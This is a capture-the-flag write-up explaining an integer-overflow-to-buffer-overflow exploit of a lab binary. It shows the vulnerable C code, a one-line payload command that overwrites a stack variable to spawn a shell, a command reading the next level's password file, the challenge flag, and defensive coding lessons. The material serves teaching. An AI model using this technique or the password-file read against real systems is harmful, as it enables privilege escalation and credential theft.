# Bonus1 - Integer Overflow to Buffer Overflow

## Table of Contents
1. [Overview](#overview)
2. [Integer Overflow Fundamentals](#integer-overflow-fundamentals)
3. [The Vulnerability](#the-vulnerability)
4. [Signed vs Unsigned Integers](#signed-vs-unsigned-integers)
5. [Left Shift Overflow](#left-shift-overflow)
6. [Exploitation Strategy](#exploitation-strategy)
7. [Payload Construction](#payload-construction)
8. [Step-by-Step Execution](#step-by-step-execution)
9. [Why This Works](#why-this-works)
10. [Security Lessons](#security-lessons)

---

## Overview

**Challenge Type**: Integer Overflow → Buffer Overflow  
**Difficulty**: Intermediate  
**Technique**: Signed/Unsigned confusion + Left shift overflow  
**Target**: Overwrite variable to match magic value

Bonus1 demonstrates how integer overflow vulnerabilities can lead to buffer overflows through signed/unsigned confusion.

---

## Integer Overflow Fundamentals

### What is Integer Overflow?

Integer overflow occurs when an arithmetic operation produces a result outside the range that can be represented by the integer type.

### Signed Integer Range (32-bit)

```
Minimum: -2,147,483,648 (0x80000000)
Maximum:  2,147,483,647 (0x7FFFFFFF)
```

### Two's Complement Representation

```
Positive numbers: 0x00000000 to 0x7FFFFFFF
Negative numbers: 0x80000000 to 0xFFFFFFFF

Example: -2147483637
Hex:    0x8000000B
Binary: 10000000 00000000 00000000 00001011
        ↑
        Sign bit (1 = negative)
```

---

## The Vulnerability

### Vulnerable Code

```c
int main(int argc, char **argv) {
    char buffer[40];
    int num;
    
    num = atoi(argv[1]);
    
    if (num > 9) {          // Signed comparison
        return 1;
    }
    
    memcpy(buffer, argv[2], num << 2);  // Integer overflow!
    
    if (num == 0x574f4c46) {  // Magic value check
        execl("/bin/sh", "sh", NULL);
    }
    
    return 0;
}
```

### The Problem

1. **Signed comparison**: `num > 9` uses signed comparison
2. **Negative numbers pass**: `-2147483637 > 9` is `FALSE`
3. **Left shift overflow**: `num << 2` can produce large positive values
4. **Buffer overflow**: Large size causes `memcpy` to overflow buffer
5. **Variable overwrite**: Overflow overwrites `num` with magic value

---

## Signed vs Unsigned Integers

### Comparison Behavior

```c
int num = -1;

// Signed comparison
if (num > 9)  // FALSE (-1 is less than 9)

// When used as size (treated as unsigned)
memcpy(dest, src, num);  // Copies 0xFFFFFFFF bytes!
```

### The Confusion

```c
int num = -2147483637;  // 0x8000000B

// Signed: -2147483637 (negative, less than 9)
// Unsigned: 2147483659 (positive, very large!)
```

---

## Left Shift Overflow

### The Left Shift Operator

```c
x << n  // Shifts x left by n bits
        // Equivalent to: x * (2^n)
```

### Overflow Example

```c
int num = -2147483637;  // 0x8000000B

Binary representation:
10000000 00000000 00000000 00001011

After << 2 (shift left 2 bits):
00000000 00000000 00000000 00101100

Result: 0x0000002C = 44 (decimal)
```

### Why This Happens

- Left shift moves all bits left
- High bits (including sign bit) are shifted out
- New bits on the right are filled with 0
- Result can change from negative to positive!

---

## Exploitation Strategy

### Goal

Overwrite the `num` variable with `0x574f4c46` to trigger shell execution.

### Requirements

1. **Pass the check**: `num <= 9`
2. **Overflow buffer**: `num << 2 >= 44` bytes
3. **Overwrite num**: Place `0x574f4c46` at correct offset

### Finding the Magic Number

We need `num` such that:
- `num <= 9` (signed comparison)
- `num << 2 = 44` (enough to overflow)

**Calculation**:
```
Target: 44 bytes
44 / 4 = 11

But 11 > 9, so we use overflow:
0x80000000 + 11 = 0x8000000B = -2147483637

Verification:
-2147483637 << 2 = 0x0000002C = 44 ✓
```

---

## Payload Construction

### Memory Layout

```
Stack layout:
┌─────────────────────────────────┐
│ buffer[40]                      │ ← memcpy destination
├─────────────────────────────────┤
│ num (4 bytes)                   │ ← Overwrite target
├─────────────────────────────────┤
│ Saved EBP                       │
├─────────────────────────────────┤
│ Return address                  │
└─────────────────────────────────┘
```

### Payload Structure

```python
payload = 'A' * 40 + '\x46\x4c\x4f\x57'
```

**Breakdown**:
- **40 bytes**: Padding to fill buffer
- **4 bytes**: `0x574f4c46` in little-endian

### The Magic Value

```
0x574f4c46 in ASCII (little-endian):
0x46 = 'F'
0x4c = 'L'
0x4f = 'O'
0x57 = 'W'

Reading backwards: "FLOW" (hint: overflow!)
```

---

## Step-by-Step Execution

### 1. Setup

```bash
./bonus1 -2147483637 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
```

### 2. Execution Flow

```
Step 1: Parse arguments
  argv[1] = "-2147483637"
  argv[2] = "AAAA...AAAA\x46\x4c\x4f\x57"

Step 2: Convert to integer
  num = atoi("-2147483637")
  num = -2147483637 (0x8000000B)

Step 3: Check condition
  if (num > 9)
  if (-2147483637 > 9) → FALSE
  Continue execution

Step 4: Calculate size
  size = num << 2
  size = -2147483637 << 2
  size = 44 bytes

Step 5: Copy data
  memcpy(buffer, argv[2], 44)
  
  Copies:
  buffer[0-39]  ← 'A' * 40
  num           ← 0x574f4c46 (OVERWRITTEN!)

Step 6: Check magic value
  if (num == 0x574f4c46)
  if (0x574f4c46 == 0x574f4c46) → TRUE

Step 7: Execute shell
  execl("/bin/sh", "sh", NULL)
  Shell spawned as bonus2 user!
```

### 3. Get Flag

```bash
cat /home/user/bonus2/.pass
```

---

## Why This Works

| Protection | Status | Impact |
|------------|--------|--------|
| NX (DEP) | Disabled | Not needed (execl used) |
| ASLR | Disabled | Predictable stack layout |
| Stack Canary | None | No overflow detection |
| Integer Overflow Check | None | Vulnerable! |

### Key Factors

1. **No bounds checking** on negative numbers
2. **Signed comparison** allows negative values
3. **Left shift** converts negative to positive
4. **No size validation** before memcpy
5. **Predictable stack layout** allows precise overwrite

---

## Security Lessons

### 1. Validate Integer Ranges

```c
// BAD
if (num > 9) return 1;

// GOOD
if (num > 9 || num < 0) return 1;

// BETTER
if (num < 0 || num > 9) {
    fprintf(stderr, "Invalid input\n");
    return 1;
}
```

### 2. Check for Overflow Before Operations

```c
// BAD
size_t size = num << 2;

// GOOD
if (num > SIZE_MAX / 4) {
    return 1;  // Would overflow
}
size_t size = num * 4;
```

### 3. Use Appropriate Types

```c
// BAD - mixing signed and unsigned
int num;
memcpy(dest, src, num);

// GOOD - use size_t for sizes
size_t size;
if (size <= sizeof(buffer)) {
    memcpy(dest, src, size);
}
```

### 4. Use Safe Arithmetic Functions

```c
// GCC/Clang built-ins
int result;
if (__builtin_mul_overflow(a, b, &result)) {
    // Overflow occurred
    return 1;
}
```

### 5. Enable Compiler Protections

```bash
gcc -ftrapv \              # Trap on signed overflow
    -fsanitize=integer \   # Integer overflow detection
    -fstack-protector-all  # Stack canaries
```

### 6. Static Analysis

Use tools to detect integer overflow:
- Clang Static Analyzer
- Coverity
- Infer
- CodeQL

---

## Real-World Examples

### CVE-2002-0391: Apache Chunked Encoding

Integer overflow in Apache's chunked encoding handling led to buffer overflow.

### CVE-2009-1897: Linux Kernel

Integer overflow in kernel's tun/tap driver.

### CVE-2013-2094: Linux Kernel

Integer overflow in perf_events subsystem led to privilege escalation.

---

## Flag

```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

